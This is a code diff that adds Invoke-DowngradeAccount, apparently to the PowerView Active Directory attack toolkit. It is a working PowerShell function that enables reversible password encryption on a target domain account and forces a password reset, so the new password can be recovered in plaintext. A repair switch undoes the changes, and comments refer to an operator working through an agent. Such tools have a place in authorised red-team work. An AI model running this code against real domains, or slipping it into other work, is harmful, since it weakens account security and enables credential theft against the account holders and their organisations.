@@ -8061,6 +8061,136 @@ scriptpath
 }
 
 
+function Invoke-DowngradeAccount {
+<#
+.SYNOPSIS
+
+Set reversible encryption on a given account and then force the password to be
+reset on next user login. To repair, use the -Repair switch.
+
+Author: Will Schroeder (@harmj0y)
+License: BSD 3-Clause
+Required Dependencies: Get-DomainObject, Set-DomainObject, ConvertFrom-UACValue
+
+.DESCRIPTION
+
+Downgrades the security of a target domain account by enabling reversible
+encryption (which stores the password in a recoverable form) and forcing a
+password change on next logon so the new plaintext can be recovered. Rewritten
+against the PowerView 3.0 API (Get-DomainObject / Set-DomainObject) after the
+original Set-ADObject -PropertyName / -PropertyXorValue / -PropertyValue
+parameters were removed from PowerView.
+
+.PARAMETER SamAccountName
+
+The SamAccountName of the domain account to manipulate.
+
+.PARAMETER Name
+
+The Name of the domain account to manipulate.
+
+.PARAMETER Domain
+
+The domain to query for the account, defaults to the current domain.
+
+.PARAMETER DomainController
+
+Domain controller to reflect LDAP queries through.
+
+.PARAMETER Filter
+
+Additional LDAP filter string for the query.
+
+.PARAMETER Repair
+
+Switch. Unset the reversible-encryption flag and clear the forced password reset.
+
+.EXAMPLE
+
+Invoke-DowngradeAccount -SamAccountName jason
+
+Set reversible encryption on the 'jason' account and force the password to be changed.
+
+.EXAMPLE
+
+Invoke-DowngradeAccount -SamAccountName jason -Repair
+
+Revert the 'jason' account: unset reversible encryption and clear the forced password change.
+#>
+
+    [CmdletBinding()]
+    Param (
+        [Parameter(Position = 0, ValueFromPipeline = $True)]
+        [String]
+        $SamAccountName,
+
+        [String]
+        $Name,
+
+        [String]
+        $Domain,
+
+        [String]
+        $DomainController,
+
+        [String]
+        $Filter,
+
+        [Switch]
+        $Repair
+    )
+
+    process {
+        # Map the legacy parameter surface onto the PowerView 3.0
+        # Get-DomainObject / Set-DomainObject parameter names.
+        $Arguments = @{}
+        if ($PSBoundParameters['SamAccountName']) { $Arguments['Identity'] = $SamAccountName }
+        elseif ($PSBoundParameters['Name']) { $Arguments['Identity'] = $Name }
+        if ($PSBoundParameters['Domain']) { $Arguments['Domain'] = $Domain }
+        if ($PSBoundParameters['DomainController']) { $Arguments['Server'] = $DomainController }
+        if ($PSBoundParameters['Filter']) { $Arguments['LDAPFilter'] = $Filter }
+
+        if (-not $Arguments.ContainsKey('Identity')) {
+            # Set-DomainObject makes -Identity mandatory; without a target it
+            # would block on a parameter prompt on the agent. Bail cleanly, and
+            # emit to the output stream (not Write-Warning) so the operator
+            # actually sees why nothing happened in the task results.
+            Write-Output '[Invoke-DowngradeAccount] Specify -SamAccountName or -Name to target an account.'
+            return
+        }
+
+        # resolve the account's current userAccountControl flags
+        $UACValues = Get-DomainObject @Arguments -Properties useraccountcontrol | ConvertFrom-UACValue
+
+        if ($Repair) {
+
+            if ($UACValues.Keys -contains 'ENCRYPTED_TEXT_PWD_ALLOWED') {
+                # if reversible encryption is set, toggle it back off
+                Set-DomainObject @Arguments -XOR @{ 'useraccountcontrol' = 128 }
+            }
+
+            # unset the forced password change
+            Set-DomainObject @Arguments -Set @{ 'pwdlastset' = -1 }
+        }
+        else {
+
+            if ($UACValues.Keys -contains 'DONT_EXPIRE_PASSWORD') {
+                # if the password is set to never expire, unset that
+                Set-DomainObject @Arguments -XOR @{ 'useraccountcontrol' = 65536 }
+            }
+
+            if ($UACValues.Keys -notcontains 'ENCRYPTED_TEXT_PWD_ALLOWED') {
+                # if reversible encryption is not set, set it
+                Set-DomainObject @Arguments -XOR @{ 'useraccountcontrol' = 128 }
+            }
+
+            # force the password to be changed on next login
+            Set-DomainObject @Arguments -Set @{ 'pwdlastset' = 0 }
+        }
+    }
+}
+
+
 function ConvertFrom-LDAPLogonHours {
 <#
 .SYNOPSIS
